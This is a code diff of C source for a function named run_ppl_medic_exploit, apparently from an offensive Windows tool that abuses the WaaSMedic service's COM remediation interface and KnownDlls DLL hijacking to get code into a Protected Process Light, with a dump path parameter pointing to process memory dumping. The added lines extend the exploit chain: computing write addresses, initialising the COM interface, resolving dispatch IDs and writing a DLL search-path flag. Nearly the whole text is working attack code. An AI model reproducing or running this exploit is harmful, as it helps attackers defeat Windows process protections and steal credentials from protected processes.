@@ -1,33 +1,42 @@
 #include "ppl/ppl_medic.h"
 #include "ppl/ppl_utils.h"
+#include "ppl/medic_client.h"
 
 BOOL run_ppl_medic_exploit(
     IN LPCSTR dump_path,
     IN BOOL use_valid_sig,
     IN BOOL duplicate_handle)
 {
-    BOOL   success                     = FALSE;
-    BOOL   ret_val                     = FALSE;
-    HANDLE hBaseNamedObjects           = NULL;
-    LPWSTR TypeLibPath                 = NULL;
-    LPWSTR TypeLibRegValuePath         = NULL;
-    LPWSTR TypeLibOrigPath             = NULL;
-    LPWSTR HollowedDllPath             = NULL;
-    LPWSTR HijackedDllName             = NULL;
-    LPWSTR HijackedDllSectionPath      = NULL;
-    LPWSTR ProxyStubRegValuePath       = NULL;
-    LPWSTR ProxyStubOrigPath           = NULL;
-    LPWSTR WaaSMedicCapsulePath        = NULL;
-    LPWSTR ProxyStubDllLoadEventName   = NULL;
-    HANDLE hTI                         = NULL;
-    BOOL   StateRegTypeLibModified     = FALSE;
-    BOOL   StateRegProxyStubModified   = FALSE;
-    BOOL   StatePluginDllLocked        = FALSE;
-    PVOID  KnownDllDirectoryHandleAddr = NULL;
-    HANDLE DllSectionHandle            = NULL;
-    HANDLE DummyDllFileHandle          = NULL;
-    HANDLE WaaSMedicCapsuleHandle      = NULL;
-    HANDLE ProxyStubDllLoadEventHandle = NULL;
+    BOOL       success                      = FALSE;
+    BOOL       ret_val                      = FALSE;
+    HANDLE     hBaseNamedObjects            = NULL;
+    LPWSTR     TypeLibPath                  = NULL;
+    LPWSTR     TypeLibRegValuePath          = NULL;
+    LPWSTR     TypeLibOrigPath              = NULL;
+    LPWSTR     HollowedDllPath              = NULL;
+    LPWSTR     HijackedDllName              = NULL;
+    LPWSTR     HijackedDllSectionPath       = NULL;
+    LPWSTR     ProxyStubRegValuePath        = NULL;
+    LPWSTR     ProxyStubOrigPath            = NULL;
+    LPWSTR     WaaSMedicCapsulePath         = NULL;
+    LPWSTR     ProxyStubDllLoadEventName    = NULL;
+    HANDLE     hTI                          = NULL;
+    BOOL       StateRegTypeLibModified      = FALSE;
+    BOOL       StateRegProxyStubModified    = FALSE;
+    BOOL       StatePluginDllLocked         = FALSE;
+    PVOID      KnownDllDirectoryHandleAddr  = NULL;
+    HANDLE     DllSectionHandle             = NULL;
+    HANDLE     DummyDllFileHandle           = NULL;
+    HANDLE     WaaSMedicCapsuleHandle       = NULL;
+    HANDLE     ProxyStubDllLoadEventHandle  = NULL;
+    PFILE_LIST TemporaryDiretoriesBefore    = NULL;
+    DWORD64    WriteAtLaunchDetectionOnly   = 0;
+    DWORD64    WriteAtLaunchRemediationOnly = 0;
+
+    PIWaaSRemediationEx IWaaSRemediationEx = NULL;
+
+    DISPID DispIdLaunchDetectionOnly   = 0;
+    DISPID DispIdLaunchRemediationOnly = 0;
 
     success = enable_debug_priv();
     if (!success)
@@ -102,6 +111,10 @@ BOOL run_ppl_medic_exploit(
     }
     DPRINT("Known DLL Directory handle @ 0x%p", KnownDllDirectoryHandleAddr);
 
+    success = calculate_write_addresses(KnownDllDirectoryHandleAddr, &WriteAtLaunchDetectionOnly, &WriteAtLaunchRemediationOnly);
+    if (!success)
+        goto cleanup;
+
     //
     // We will prepare the DLL hijacking of the 'TaskSchdPS.dll' DLL by 1. creating a section
     // in the object manager for our own DLL with a random name in the \BaseNamedObjects
@@ -175,6 +188,22 @@ BOOL run_ppl_medic_exploit(
     // we repeat the operation until we succeed or we reach the maximum number of attempts.
     //
 
+    success = enumerate_temporary_directories(&TemporaryDiretoriesBefore);
+    if (!success)
+        goto cleanup;
+
+    success = initialize_interface(&IWaaSRemediationEx);
+    if (!success)
+        goto cleanup;
+
+    success = resolve_dispatch_ids(IWaaSRemediationEx, &DispIdLaunchDetectionOnly, &DispIdLaunchRemediationOnly);
+    if (!success)
+        goto cleanup;
+
+    success = write_remote_dll_search_path_flag(IWaaSRemediationEx, DispIdLaunchRemediationOnly);
+    if (!success)
+        goto cleanup;
+
 cleanup:
     if (hBaseNamedObjects)
         NtClose(hBaseNamedObjects);
@@ -202,10 +231,83 @@ cleanup:
         intFree(WaaSMedicCapsulePath);
     if (ProxyStubDllLoadEventName)
         intFree(ProxyStubDllLoadEventName);
+    if (TemporaryDiretoriesBefore)
+    {
+        // TODO: free TemporaryDiretoriesBefore
+    }
 
     // TODO: StateRegTypeLibModified ?
     // TODO: StateRegProxyStubModified ?
     // TODO: StatePluginDllLocked ?
+    // TODO: free IWaaSRemediationEx?
+    // TODO: CoUninitialize
+
+    return ret_val;
+}
+
+BOOL enumerate_temporary_directories(
+    OUT PFILE_LIST* pfile_list)
+{
+    BOOL             ret_val           = FALSE;
+    BOOL             success           = FALSE;
+    WIN32_FIND_DATAW FindData          = { 0 };
+    LPWSTR           pwszSearchPattern = NULL;
+    HANDLE           hFind             = NULL;
+    PFILE_LIST       file_list         = NULL;
+    PFILE_LIST       current_file      = NULL;
+
+    // TODO: dinvoke
+
+    *pfile_list = NULL;
+
+    success = get_windows_temp_directory(&pwszSearchPattern);
+    if (!success)
+    {
+        function_failed("GetWindowsTempDirectory");
+        goto cleanup;
+    }
+
+    swprintf_s(pwszSearchPattern, MAX_PATH, L"%ws\\%ws", pwszSearchPattern, L"_????????-????-????-????-????????????");
+
+    if ((hFind = FindFirstFileW(pwszSearchPattern, &FindData)) == INVALID_HANDLE_VALUE)
+    {
+        if (GetLastError() == ERROR_FILE_NOT_FOUND)
+            ret_val = TRUE;
+        else
+        {
+            function_failed("FindFirstFileW");
+        }
+
+        goto cleanup;
+    }
+
+    do
+    {
+        current_file = intAlloc(sizeof(FILE_LIST));
+        if (!current_file)
+        {
+            malloc_failed();
+            goto cleanup;
+        }
+
+        current_file->Next = file_list;
+        file_list          = current_file;
+
+        swprintf_s(current_file->FileName, MAX_PATH, L"%ws", FindData.cFileName);
+        DPRINT("current_file->FileName: %ls", current_file->FileName);
+
+    } while (FindNextFileW(hFind, &FindData));
+
+    ret_val = TRUE;
+
+cleanup:
+    if (!ret_val)
+    {
+        DPRINT_ERR("Failed to enumerate temp directory: %ls", pwszSearchPattern);
+    }
+
+    if (hFind && hFind != INVALID_HANDLE_VALUE) FindClose(hFind);
+    safe_free((PVOID*)&pwszSearchPattern);
 
     return ret_val;
 }
